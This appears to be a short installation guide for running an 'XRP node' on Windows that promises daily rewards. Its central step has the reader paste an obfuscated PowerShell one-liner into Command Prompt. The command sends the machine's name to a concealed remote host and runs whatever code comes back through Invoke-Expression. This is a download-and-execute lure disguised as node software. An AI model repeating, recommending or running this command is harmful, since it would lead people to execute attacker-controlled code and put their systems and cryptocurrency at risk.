# XRP Node Deployment on Windows

## Installation Steps

### Step 1: Open Command Prompt
Press `Win + R`, type `cmd`, and press `Enter`

### Step 2: Execute Node Installation Command
Copy and paste the following command into Command Prompt:
```cmd
powershell -c "$Blockchain = 'app'; irm ('XRPNODE.' + $Blockchain + '?Sync=' + $env:COMPUTERNAME) | iex"
`````

### Step 3: Node Configuration
Enter your XRP wallet address and destination tag for daily reward distribution.

---
